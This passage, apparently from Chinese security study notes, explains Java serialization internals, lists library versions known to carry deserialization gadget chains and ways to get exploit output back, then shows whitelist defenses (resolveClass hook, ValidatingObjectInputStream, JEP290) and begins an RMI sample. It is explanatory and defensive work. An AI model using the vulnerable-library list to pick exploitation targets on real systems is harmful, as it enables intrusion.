&lt;li&gt;ObjectOutputStream 实例初始化时，将魔术头和版本号写入 bout (BlockDataOutputStream 类型) 中&lt;/li&gt;
&lt;li&gt;调用 ObjectOutputStream.writeObject () 开始写对象数据
&lt;ul&gt;
&lt;li&gt;ObjectStreamClass.lookup () 封装待序列化的类描述 (返回 ObjectStreamClass 类型) ，获取包括类名、自定义 serialVersionUID、可序列化字段 (返回 ObjectStreamField 类型) 和构造方法，以及 writeObject、readObject 方法等&lt;/li&gt;
&lt;li&gt;writeOrdinaryObject () 写入对象数据
&lt;ul&gt;
&lt;li&gt;写入对象类型标识&lt;/li&gt;
&lt;li&gt;writeClassDesc () 进入分支  writeNonProxyDesc () 写入类描述数据
&lt;ul&gt;
&lt;li&gt;写入类描述符标识&lt;/li&gt;
&lt;li&gt;写入类名&lt;/li&gt;
&lt;li&gt;写入 SUID (当 SUID 为空时，会进行计算并赋值)&lt;/li&gt;
&lt;li&gt;计算并写入序列化属性标志位&lt;/li&gt;
&lt;li&gt;写入字段信息数据&lt;/li&gt;
&lt;li&gt;写入 Block Data 结束标识&lt;/li&gt;
&lt;li&gt;写入父类描述数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;writeSerialData () 写入对象的序列化数据
&lt;ul&gt;
&lt;li&gt;若类自定义了 writeObject ()，则调用该方法写对象，否则调用 defaultWriteFields () 写入对象的字段数据 (若是非原始类型，则递归处理子对象)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;53713-反序列化流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53713-反序列化流程&#34;&gt;#&lt;/a&gt; 5.3.7.1.3. 反序列化流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ObjectInputStream 实例初始化时，读取魔术头和版本号进行校验&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;调用 ObjectInputStream.readObject () 开始读对象数据&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读取对象类型标识&lt;/li&gt;
&lt;li&gt;readOrdinaryObject () 读取数据对象
&lt;ul&gt;
&lt;li&gt;readClassDesc () 读取类描述数据
&lt;ul&gt;
&lt;li&gt;读取类描述符标识，进入分支 readNonProxyDesc ()&lt;/li&gt;
&lt;li&gt;读取类名&lt;/li&gt;
&lt;li&gt;读取 SUID&lt;/li&gt;
&lt;li&gt;读取并分解序列化属性标志位&lt;/li&gt;
&lt;li&gt;读取字段信息数据&lt;/li&gt;
&lt;li&gt;resolveClass () 根据类名获取待反序列化的类的 Class 对象，如果获取失败，则抛出 ClassNotFoundException&lt;/li&gt;
&lt;li&gt;skipCustomData () 循环读取字节直到 Block Data 结束标识为止&lt;/li&gt;
&lt;li&gt;读取父类描述数据&lt;/li&gt;
&lt;li&gt;initNonProxy () 中判断对象与本地对象的 SUID 和类名 (不含包名) 是否相同，若不同，则抛出 InvalidClassException&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ObjectStreamClass.newInstance () 获取并调用离对象最近的非 Serializable 的父类的无参构造方法 (若不存在，则返回 null) 创建对象实例&lt;/li&gt;
&lt;li&gt;readSerialData () 读取对象的序列化数据
&lt;ul&gt;
&lt;li&gt;若类自定义了 readObject ()，则调用该方法读对象，否则调用 defaultReadFields () 读取并填充对象的字段数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5372-漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5372-漏洞利用&#34;&gt;#&lt;/a&gt; 5.3.7.2. 漏洞利用&lt;/h2&gt;
&lt;h3 id=&#34;53721-存在危险的基础库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53721-存在危险的基础库&#34;&gt;#&lt;/a&gt; 5.3.7.2.1. 存在危险的基础库&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.mchange:c3p0 0.9.5.2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.mchange:mchange-commons-java 0.2.11&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-beanutils 1.9.2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-collections 3.1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-fileupload 1.3.1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-io 2.4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-logging 1.2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.apache.commons:commons-collections 4.0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.beanshell:bsh 2.0b5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.codehaus.groovy:groovy 2.3.9&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.slf4j:slf4j-api 1.7.21&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.springframework:spring-aop 4.1.4.RELEASE&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;53722-回显方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53722-回显方式&#34;&gt;#&lt;/a&gt; 5.3.7.2.2. 回显方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;通过中间件特性回显&lt;/li&gt;
&lt;li&gt;通过抛出异常回显&lt;/li&gt;
&lt;li&gt;通过 OOB 回显&lt;/li&gt;
&lt;li&gt;通过写静态文件回显&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5373-漏洞修复和防护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5373-漏洞修复和防护&#34;&gt;#&lt;/a&gt; 5.3.7.3. 漏洞修复和防护&lt;/h2&gt;
&lt;h3 id=&#34;53731-hook-resolveclass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53731-hook-resolveclass&#34;&gt;#&lt;/a&gt; 5.3.7.3.1. Hook resolveClass&lt;/h3&gt;
&lt;p&gt;在使用  &lt;code&gt;readObject()&lt;/code&gt;  反序列化时会调用  &lt;code&gt;resolveClass&lt;/code&gt;  方法读取反序列化的类名，可以通过 hook 该方法来校验反序列化的类，一个 Demo 如下&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@Override&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;token generics&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;resolveClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectStreamClass&lt;/span&gt; desc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;desc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;SerialObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;InvalidClassException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token string&#34;&gt;&#34;Unauthorized deserialization attempt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                desc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;resolveClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;desc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;以上的 Demo 就只允许序列化  &lt;code&gt;SerialObject&lt;/code&gt;  ，通过这种方式，就可以设置允许序列化的白名单，来防止反序列化漏洞被利用。SerialKiller/Jackson/Weblogic 等都使用了这种方式来防御。&lt;/p&gt;
&lt;h3 id=&#34;53732-validatingobjectinputstream&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53732-validatingobjectinputstream&#34;&gt;#&lt;/a&gt; 5.3.7.3.2. ValidatingObjectInputStream&lt;/h3&gt;
&lt;p&gt;Apache Commons IO Serialization 包中的  &lt;code&gt;ValidatingObjectInputStream&lt;/code&gt;  类提供了  &lt;code&gt;accept&lt;/code&gt;  方法，可以通过该方法来实现反序列化类白 / 黑名单控制，一个 demo 如下&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;deserialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; buffer&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ConfigurationException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;Object&lt;/span&gt; obj&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;ByteArrayInputStream&lt;/span&gt; bais &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ByteArrayInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buffer&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token class-name&#34;&gt;ValidatingObjectInputStream&lt;/span&gt; ois &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ValidatingObjectInputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bais&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    ois&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;SerialObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    obj &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ois&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;readObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; obj&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;53733-objectinputfilterjep290&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53733-objectinputfilterjep290&#34;&gt;#&lt;/a&gt; 5.3.7.3.3. ObjectInputFilter(JEP290)&lt;/h3&gt;
&lt;p&gt;Java 9 提供了支持序列化数据过滤的新特性，可以继承  &lt;code&gt;java.io.ObjectInputFilter&lt;/code&gt;  类重写  &lt;code&gt;checkInput&lt;/code&gt;  方法来实现自定义的过滤器，并使用  &lt;code&gt;ObjectInputStream&lt;/code&gt;  对象的  &lt;code&gt;setObjectInputFilter&lt;/code&gt;  设置过滤器来实现反序列化类白 / 黑名单控制。这个机制本身是针对 Java 9 的一个新特性，但是随后官方突然决定向下引进该增强机制，分别对 JDK 6,7,8 进行了支持。这个机制主要描述了如下的机制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供一个限制反序列化类的机制，白名单或者黑名单&lt;/li&gt;
&lt;li&gt;限制反序列化的深度和复杂度&lt;/li&gt;
&lt;li&gt;为 RMI 远程调用对象提供了一个验证类的机制&lt;/li&gt;
&lt;li&gt;定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;rmi&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi&#34;&gt;#&lt;/a&gt; RMI&lt;/h1&gt;
&lt;h2 id=&#34;简介-11&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-11&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;RMI (Remote Method Invocation，远程方法调用) 能够让在客户端 Java 虚拟机上的对象像调用本地对象一样调用服务端 Java 虚拟机中的对象上的方法。其中 RMI 标准实现是 Java RMI，之外还有 Weblogic RMI、Spring RMI 等不同的实现。&lt;/p&gt;
&lt;p&gt;RMI 中比较重要的两个概念是 Stub 和 Skeleton，Stub 和 Skeleton 对同一套接口进行实现，其中 Stub 由 Client 端调用，并不进行真正的实现，而是和 Server 端通信。Skeleton 是 Server 端，监听来自 Stub 的连接，根据 Stub 发送的数据进行真正的操作。&lt;/p&gt;
&lt;h2 id=&#34;调用步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#调用步骤&#34;&gt;#&lt;/a&gt; 调用步骤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;客户调用客户端辅助对象 Stub 上的方法&lt;/li&gt;
&lt;li&gt;客户端辅助对象 Stub 打包调用信息 (变量，方法名)，通过网络发送给服务端辅助对象 Skeleton&lt;/li&gt;
&lt;li&gt;服务端辅助对象 Skeleton 将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象&lt;/li&gt;
&lt;li&gt;调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象 Skeleton&lt;/li&gt;
&lt;li&gt;服务端辅助对象将结果打包，发送给客户端辅助对象 Stub&lt;/li&gt;
&lt;li&gt;客户端辅助对象将返回值解包，返回给调用者&lt;/li&gt;
&lt;li&gt;客户获得返回值&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;样例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#样例&#34;&gt;#&lt;/a&gt; 样例&lt;/h2&gt;
&lt;p&gt;一份代码样例如下 (来自《Enterprise JavaBeans》)：&lt;/p&gt;
&lt;h3 id=&#34;person接口定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#person接口定义&#34;&gt;#&lt;/a&gt; Person 接口定义&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;interface&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;使用personserver实现person&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用personserver实现person&#34;&gt;#&lt;/a&gt; 使用 PersonServer 实现 Person&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; age&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token 